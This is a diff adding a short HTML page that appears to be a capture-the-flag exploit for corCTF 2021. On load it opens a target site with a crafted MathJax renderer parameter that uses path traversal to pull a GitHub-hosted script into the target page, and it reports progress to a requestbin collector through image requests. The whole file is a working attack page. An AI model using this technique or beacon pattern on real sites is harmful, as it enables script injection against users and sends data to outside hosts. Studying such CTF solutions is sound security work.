@@ -1,0 +1,19 @@
+<html>
+    <head>
+        <script>
+            function next() {
+                telemetry("start");
+                var url = "https://mathme.be.ax/note?id=0;mjx.menu=renderer%3A..%2F..%2F..%2F..%2Fgh%2Fdzil123%2Fcorctf2021%2F7";
+                var do_open = function() { window.open(url); telemetry("open_window"); };
+                do_open();
+                setTimeout(do_open, 2000);
+            }
+
+            function telemetry(data) {
+                (new Image()).src = "https://requestbin.io/ub238iub?data=" + data;
+            }
+        </script>
+    </head>
+    <body onload="next()">
+    </body>
+</html>
